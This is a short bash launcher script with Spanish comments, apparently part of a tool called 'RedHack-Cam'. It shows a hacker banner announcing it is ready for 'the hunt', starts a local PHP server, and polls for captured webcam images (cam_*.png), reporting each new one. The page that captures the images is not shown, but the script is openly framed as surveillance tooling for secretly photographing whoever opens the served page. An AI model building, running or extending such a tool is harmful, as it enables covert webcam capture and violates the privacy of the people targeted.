#!/bin/bash
# RedHack-Cam v1.1 - Corregido para Arch Linux

BLUE='\033[0;34m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m'

clear

# Banner usando bloques limpios para evitar errores de sintaxis
cat << "EOF"
                   -`                    ____           _ _   _            _    
                  .o+`                  |  _ \ ___   __| | | | | __ _  ___| | __
                 `ooo/                  | |_) / _ \ / _` | |_| |/ _` |/ __| |/ /
                `+oooo:                 |  _ <  __/| (_| |  _  | (_| | (__|   < 
               `+oooooo:                |_| \_\___| \__,_|_| |_|\__,_|\___|_|\_\
               -+oooooo+:                
             `/:-:++oooo+:                     BY: REDHACK-CYPER [Cazador]
            `/++++/+++++++:              
           `/++++++++++++++:                   SISTEMA: Arch Linux ARM
          `/+++ooooooooooooo/`                 ESTADO:  Listo para la caza...
         ./ooossssqtttssssooo+-          
        .ooosssshhhwwshhhhsssooo.        
       -osssssshhhhhhhshhhhhhhssso-      
      :osssssshhhhhhhhhshhhhhhhssso:     
     /osssssshhhhhhhhhhhshhhhhhhssso/    
    .osssssshhhhhhhhhhhhhshhhhhhhssso.   
   `osssssshhhhhhhhhhhhhhhshhhhhhhssso`  
   .osssshhhhhhhhhhhhhhhhhhhshhhhhhssso. 
   `osshhhhhhhhhhhhhhhhhhhhhhhshhhhhhss` 
EOF

echo -e "${CYAN}[+] Encendiendo servidor local de RedHack...${NC}"
php -S 127.0.0.1:8080 > /dev/null 2>&1 &
PHP_PID=$!
sleep 2

echo -e "${CYAN}[+] URL: http://127.0.0.1:8080${NC}"
echo -e "${RED}[!] Esperando capturas de cámara...${NC}"
echo "--------------------------------------------------------"

while true; do
    if ls cam_*.png 1> /dev/null 2>&1; then
        echo -e "${RED}[🚨] FOTO CAPTURADA EN ARCH LINUX [🚨]${NC}"
        ls -t cam_*.png | head -1
    fi
    sleep 5
done

kill $PHP_PID
